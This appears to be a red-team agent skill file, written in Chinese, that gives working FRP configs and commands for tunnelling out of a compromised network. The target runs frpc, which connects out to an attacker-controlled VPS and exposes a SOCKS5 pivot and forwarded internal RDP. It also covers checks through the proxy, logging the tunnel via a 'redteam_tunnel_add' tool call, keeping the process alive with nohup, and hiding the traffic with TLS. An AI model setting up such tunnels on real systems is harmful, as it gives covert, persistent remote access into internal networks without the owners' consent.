---
name: frp-tunnel
description: FRP 隧道：需要 VPS，适合长期稳定的内网穿透与多端口转发
tags: tunnel, frp
---

# FRP 隧道

> 需要一台**你能控制的 VPS**（`VPS_IP`）。适合需要长期稳定、多端口并发的场景。

## 服务端（VPS）

`frps.ini`：

```ini
[common]
bind_port = 7000
token = <随机长串>
```

```bash
./frps -c frps.ini
```

## 客户端（目标侧）

`frpc.ini`：

```ini
[common]
server_addr = <VPS_IP>
server_port = 7000
token = <同一串>

[socks5]
type = tcp
remote_port = 1080
plugin = socks5
```

```bash
./frpc -c frpc.ini
```

VPS 的 1080 就是 socks5 入口。

## 多端口转发

```ini
[rdp]
type = tcp
local_ip = 10.0.0.5
local_port = 3389
remote_port = 13389
```

## 验证与落库

```bash
curl -x socks5://<VPS_IP>:1080 http://10.0.0.5/ -m 5 -i
```

```
redteam_tunnel_add({
  entryKind: 'target-outbound',       // 目标主动连出到 VPS
  listen: 'socks5://<VPS_IP>:1080',
  reachable: '10.0.0.0/24'
})
```

## 判定标准

- [ ] frpc 在目标侧跑起来了（`ps` 可见）
- [ ] 代理实测能访问内网目标
- [ ] 写的是 `target-outbound`（目标连出），不是"我自己 VPS 上的代理"

## 常见坑

| 坑 | 处理 |
|---|---|
| token 没设 → 被扫到滥用 | 必须设长 token |
| 端口暴露在公网无鉴权 | 限制 VPS 防火墙只放自己 IP |
| frpc 进程随会话死 | `nohup` / 做成服务 |
| 端口冲突 | 换 `remote_port`，先查 VPS 占用 |
| 流量特征明显 | 上 TLS（`transport.tls.enable = true`） |
